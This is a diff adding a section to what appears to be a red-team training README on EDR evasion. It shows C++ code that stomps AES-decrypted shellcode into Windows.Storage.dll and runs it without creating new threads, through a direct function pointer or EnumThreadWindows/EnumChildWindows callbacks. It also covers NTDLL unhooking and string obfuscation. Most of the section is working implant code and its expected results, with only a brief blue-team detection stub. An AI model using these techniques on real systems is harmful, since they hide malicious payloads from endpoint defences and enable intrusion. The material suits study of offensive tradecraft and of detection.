@@ -2885,3 +2885,480 @@ compile.bat
 - EDR Bypass Research Papers
 
 </details>
+
+
+
+
+<details>
+<summary>09 - No-New-Thread Payload Execution</summary>
+
+## Overview
+
+No-New-Thread execution is an advanced technique that avoids creating new threads to execute payloads, instead hijacking existing thread execution flows. This approach significantly reduces detection surface by avoiding kernel-level thread creation events that EDR systems monitor.
+
+## The Problem: Thread Creation Detection
+
+### Why New Threads Are Detectable
+
+When you create a new thread using `CreateThread()` or similar APIs:
+
+1. **Kernel-Level Visibility**: Thread creation events are visible at the kernel level
+2. **EDR Monitoring**: Endpoint Detection Response systems hook thread creation APIs
+3. **Behavioral Analysis**: New threads executing from unusual memory regions are suspicious
+4. **Telemetry Data**: Thread creation generates ETW events and other telemetry
+
+### The Drawbacks of Traditional Thread Creation
+
+```cpp
+// Current implementation - creates detectable thread
+CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+```
+
+**Problems:**
+- Creates new thread entry in thread list
+- Generates kernel-level thread creation events
+- EDRs can correlate thread creation with other suspicious activities
+
+## Step-by-Step Implementation
+
+[02.Non-admin/04.PayloadExec](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/04.PayloadExec)
+
+### Step 1: Baseline - Module Stomping with Thread Creation
+
+First, let's examine the current implementation that creates detectable threads:
+
+#### Compile and Run Baseline
+
+```batch
+cd 09.NoNewThread
+compile.bat
+implant.exe
+```
+
+<img width="1028" height="658" alt="image" src="https://github.com/user-attachments/assets/16e791a2-40f6-48ad-acb3-131fbb61d487" />
+
+
+**Current Code Analysis:**
+```cpp
+// Load Windows.Storage.dll for module stomping
+HMODULE hVictimLib = LoadLibrary((LPCSTR)sLib);
+
+if (hVictimLib != NULL) {
+    // Module stomping - hide payload at offset 0x200C in Windows.Storage.dll
+    char *ptr = (char *)hVictimLib + 2*4096 + 12;  // 0x200C
+    
+    printf("ptr: %p\n", ptr);  // Shows address like 0x7FF...200C
+    
+    // Change protection and write payload to DLL memory
+    VirtualProtect_p((char *)ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);
+    AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));
+    RtlMoveMemory(ptr, payload, payload_len);
+    VirtualProtect_p((char *)ptr, payload_len + 4096, oldprotect, &oldprotect);
+
+    printf("Hitme!\n"); 
+    getchar();  // Pause for analysis
+
+    // PROBLEM: Creates detectable thread
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+    
+    printf("Bye-Bye?\n"); 
+    getchar();
+}
+```
+
+**Process Hacker Analysis Before Execution:**
+- **Threads Tab**: Shows only main thread
+- **Memory Regions**: Windows.Storage.dll loaded but payload not yet written
+- **Process State**: Normal console application
+
+**Process Hacker Analysis After Execution:**
+- **Threads Tab**: New thread appears with start address in Windows.Storage.dll
+- **Detection Risk**: New thread creation is visible to EDRs at kernel level
+
+<img width="1322" height="747" alt="image" src="https://github.com/user-attachments/assets/0f95843e-414a-46c4-9076-0db307e73f09" />
+<img width="1007" height="744" alt="image" src="https://github.com/user-attachments/assets/b2381078-3993-48e2-a8fa-4583f4be8fa7" />
+
+
+### Step 2: Technique 1 - Direct Function Pointer Execution
+
+The simplest no-new-thread technique: execute the payload directly from the current thread.
+
+#### Implementation
+
+Uncomment the direct function call and comment out `CreateThread`:
+
+```cpp
+// Replace this (comment out):
+// CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+
+// With this (uncomment):
+void (*go)() = (void (*)()) ptr; 
+go();
+```
+
+<img width="1679" height="837" alt="image" src="https://github.com/user-attachments/assets/fb408028-5034-44cf-8df5-19e2a278a8e2" />
+
+
+**Complete Implementation:**
+```cpp
+if (hVictimLib != NULL) {
+    char *ptr = (char *)hVictimLib + 2*4096 + 12;
+    
+    printf("ptr: %p\n", ptr);
+    
+    // Setup payload in Windows.Storage.dll memory
+    VirtualProtect_p((char *)ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);
+    AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));
+    RtlMoveMemory(ptr, payload, payload_len);
+    VirtualProtect_p((char *)ptr, payload_len + 4096, oldprotect, &oldprotect);
+
+    printf("Hitme!\n"); 
+    getchar();
+
+    // Technique 1: Direct function pointer call
+    void (*go)() = (void (*)()) ptr;  // Create function pointer to shellcode
+    go();  // Execute directly in current thread
+    
+    printf("Bye-Bye?\n"); 
+    getchar();
+}
+```
+
+#### How This Works
+
+**Function Pointer Explanation:**
+```cpp
+// This creates a function pointer that points to our shellcode
+void (*go)() = (void (*)()) ptr;
+
+// Breakdown:
+// - void (*go)()    : Declares 'go' as pointer to function returning void, taking no parameters
+// - (void (*)())    : Casts our shellcode address to the function pointer type  
+// - ptr             : Address of our shellcode in Windows.Storage.dll
+// - go()            : Calls the function, transferring execution to our shellcode
+```
+
+#### Testing and Analysis
+
+**Compile and Run:**
+```batch
+compile.bat
+implant.exe
+```
+
+<img width="1231" height="642" alt="image" src="https://github.com/user-attachments/assets/fe8e18f5-cf0d-4bc6-87d5-cac3b49358f8" />
+
+Hit `enter`:
+
+<img width="1258" height="671" alt="image" src="https://github.com/user-attachments/assets/5df169a9-fe2c-49ed-98ab-5253c8c98e47" />
+
+
+
+**Process Hacker Observations:**
+- **No New Threads Created**: Thread count remains exactly the same
+- **Main Thread Execution**: Payload runs in the main thread context
+  <img width="1235" height="785" alt="image" src="https://github.com/user-attachments/assets/96867c7a-ac05-4382-b1c3-c85f2010bd4b" />
+
+- **Call Stack**: Shows execution originating from Windows.Storage.dll
+- **Stealth Benefit**: No kernel-level thread creation events generated
+
+**The Critical Drawback - Zombie Process:**
+```cpp
+void (*go)() = (void (*)()) ptr;
+go();  // If shellcode doesn't return properly, main thread dies
+
+// After MessageBox OK is clicked:
+// - Shellcode execution completes
+// - Main thread terminates (doesn't reach "Bye-Bye?" printf)
+// - Process remains as zombie without main thread
+// - Console window hangs because main thread is dead
+```
+
+<img width="1420" height="723" alt="image" src="https://github.com/user-attachments/assets/b192c980-e65a-471a-9add-36060b1f8152" />
+
+
+### Step 3: Technique 2 - Windows API Callback Hijacking
+
+A more sophisticated approach: use Windows API functions that accept callback functions.
+
+#### Implementation Using EnumThreadWindows
+
+Uncomment the `EnumThreadWindows` line:
+
+```cpp
+// Replace direct call with API callback:
+EnumThreadWindows(0, (WNDENUMPROC)ptr, 0);
+```
+
+<img width="1680" height="733" alt="image" src="https://github.com/user-attachments/assets/88f16c9e-bfe5-40d5-9312-1fbd172bfdb3" />
+
+
+**Complete Implementation:**
+```cpp
+if (hVictimLib != NULL) {
+    char *ptr = (char *)hVictimLib + 2*4096 + 12;
+    
+    // Setup payload as before
+    VirtualProtect_p((char *)ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);
+    AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));
+    RtlMoveMemory(ptr, payload, payload_len);
+    VirtualProtect_p((char *)ptr, payload_len + 4096, oldprotect, &oldprotect);
+
+    printf("Hitme!\n"); 
+    getchar();
+
+    // Technique 2: Use EnumThreadWindows API callback
+    EnumThreadWindows(0, (WNDENUMPROC)ptr, 0);
+    
+    printf("Bye-Bye?\n"); 
+    getchar();
+}
+```
+
+#### How EnumThreadWindows Works
+
+**API Function Signature:**
+```cpp
+BOOL EnumThreadWindows(
+  DWORD       dwThreadId,      // Thread to enumerate (0 = current thread)
+  WNDENUMPROC lpfn,            // CALLBACK function - our payload!
+  LPARAM      lParam           // Additional parameter (0 = not used)
+);
+```
+
+**Execution Flow:**
+1. `EnumThreadWindows` enumerates all windows associated with current thread
+2. For each window found, it calls the callback function (our shellcode)
+3. Our shellcode executes as the callback within the API's context
+4. The API manages the execution stack and properly returns
+
+#### Testing and Analysis
+
+**Compile and Run:**
+```batch
+compile.bat
+implant.exe
+```
+
+**Observations:**
+- **No New Threads**: Thread count remains constant
+- **Stable Execution**: Main thread continues after payload execution
+- **Process State**: Process remains healthy, reaches "Bye-Bye?" message
+- **Stealth**: Leverages legitimate Windows API behavior
+
+<img width="1532" height="748" alt="image" src="https://github.com/user-attachments/assets/60d86bb2-c424-41d1-869c-dbaccf10eb20" />
+
+### Step 4: Technique 3 - EnumChildWindows Callback
+
+Alternative API that works similarly:
+
+#### Implementation
+
+```cpp
+// Option: Use EnumChildWindows instead
+EnumChildWindows((HWND)NULL, (WNDENUMPROC)ptr, NULL);
+```
+
+**How It Differs:**
+- `EnumChildWindows` enumerates child windows of a specified parent
+- `(HWND)NULL` means enumerate all top-level windows
+- Similar callback mechanism but different enumeration target
+
+## Technical Deep Dive
+
+### Memory Protection Strategy
+
+**Why This Approach is Effective:**
+```cpp
+// The memory is already executable (DLL .text section)
+// We only need to make it writable temporarily
+VirtualProtect_p((char *)ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);
+
+// After writing payload, restore original protection
+// The memory remains executable because it's in a DLL image section
+```
+
+### Shellcode Compatibility
+
+**For Direct Function Call:**
+```cpp
+// Shellcode must be written as a proper function:
+void shellcode() {
+    // Function prologue (if needed)
+    // Payload functionality  
+    // Function epilogue with proper return
+}
+```
+
+**For API Callbacks:**
+```cpp
+// Shellcode must match WNDENUMPROC signature:
+BOOL CALLBACK ShellcodeCallback(HWND hwnd, LPARAM lParam) {
+    // Payload functionality
+    return TRUE;  // Continue enumeration
+    // return FALSE; // Stop enumeration after first callback
+}
+```
+
+### Debugger Analysis
+
+**Step-by-Step Debugging:**
+
+1. **Set breakpoint** on the execution method
+2. **Run implant** and note the `ptr` address
+3. **Examine memory** at that address before/after stomping
+4. **Step through** the execution method
+5. **Observe thread count** in debugger
+
+**Expected Memory State:**
+```
+Before stomping (Windows.Storage.dll + 0x200C):
+CC CC CC CC CC CC CC CC   ; INT3 padding (typical in unused DLL regions)
+
+After stomping:
+E8 1F 00 00 00          ; call instructions (shellcode)
+48 83 EC 28             ; stack manipulation
+...                     ; rest of decrypted payload
+```
+
+## Advanced Implementation Details
+
+### Multiple Execution Techniques
+
+The code provides three commented options:
+
+```cpp
+// Option 1: Traditional thread creation (detectable)
+// CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
+
+// Option 2: Direct function call (risky)
+// void (*go)() = (void (*)()) ptr; go();
+
+// Option 3: API callback (recommended)
+// EnumThreadWindows(0, (WNDENUMPROC)ptr, 0);
+// EnumChildWindows((HWND)NULL, (WNDENUMPROC)ptr, NULL);
+```
+
+### Security Features in Place
+
+**Existing Protections:**
+1. **Module Stomping**: Payload hidden in legitimate Windows.Storage.dll
+2. **ETW Unhooking**: NTDLL hooks removed before execution
+3. **String Obfuscation**: Critical strings XOR encrypted
+4. **Payload Encryption**: AES-encrypted shellcode
+
+**Added Stealth:**
+- No new thread creation events
+- Execution appears as legitimate API callback
+- File-backed executable memory
+
+## Detection and Mitigation
+
+### Why These Techniques Are Effective
+
+**Avoids Common Detection Points:**
+- No `CreateThread` or `NtCreateThread` calls
+- No new thread objects in kernel
+- No unusual memory allocations
+- Execution originates from legitimate DLL
+
+### Remaining Detection Opportunities
+
+**Advanced EDRs May Detect:**
+1. **API Monitoring**: Unusual use of callback APIs with non-standard addresses
+2. **Code Integrity**: Modified .text sections in loaded DLLs
+3. **Behavioral Analysis**: Callbacks that don't behave as expected
+4. **Memory Scanning**: Unusual code patterns in typically unused DLL regions
+
+### Defensive Strategies
+
+**For Blue Teams:**
+```cpp
+// Monitor for suspicious callback addresses
+BOOL IsSuspiciousCallback(WNDENUMPROC callback) {
+    HMODULE hModule;
+    if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, 
+                         (LPCSTR)callback, &hModule)) {
+        // Check if callback is in typically unused regions
+        // Verify code integrity of callback region
+    }
+    return FALSE;
+}
+```
+
+## Practical Testing Guide
+
+### Step-by-Step Verification
+
+1. **Compile Each Technique:**
+   ```batch
+   compile.bat
+   ```
+
+2. **Run with Process Hacker:**
+   - Monitor thread count before/after execution
+   - Check if "Bye-Bye?" message appears (indicates thread survival)
+   - Verify process state remains healthy
+
+3. **Expected Results:**
+
+| Technique | New Threads | Process State | "Bye-Bye?" Reached |
+|-----------|-------------|---------------|-------------------|
+| CreateThread | Yes | Stable | Yes |
+| Direct Call | No | Zombie Risk | No |
+| API Callback | No | Stable | Yes |
+
+### Debugger Verification
+
+**Check Thread Creation:**
+- Set breakpoint on thread creation APIs
+- Verify no calls to `CreateThread`/`NtCreateThread`
+- Confirm execution flows through API callbacks
+
+**Memory Analysis:**
+- Verify payload is written to Windows.Storage.dll
+- Check that memory protection changes are minimal
+- Confirm no new RX/RWX memory regions
+
+## Building the Project
+
+### Prerequisites
+
+- Visual Studio 2019 or later
+- Windows SDK
+- C++ development tools
+
+### Compilation
+
+```batch
+cd 09.NoNewThread
+compile.bat
+```
+
+## Code Explanation
+
+### Key Security Components
+
+**AESDecrypt:**
+- Uses Windows Crypto API for payload decryption
+- AES-256 with SHA-256 key derivation
+- Ensures payload is encrypted at rest
+
+**UnhookNtdll:**
+- Loads clean NTDLL from disk
+- Copies .text section to remove EDR hooks
+- Critical for bypassing user-mode hooks
+
+**XORcrypt:**
+- Simple string obfuscation
+- Hides file paths from static analysis
+
+### Execution Flow
+
+1. **Setup**: Decrypt strings, load DLLs, remove hooks
+2. **Module Stomping**: Write payload to Windows.Storage.dll
+3. **Execution**: Choose no-thread execution method
+4. **Cleanup**: Process continues or terminates based on method
+
+
+</details>
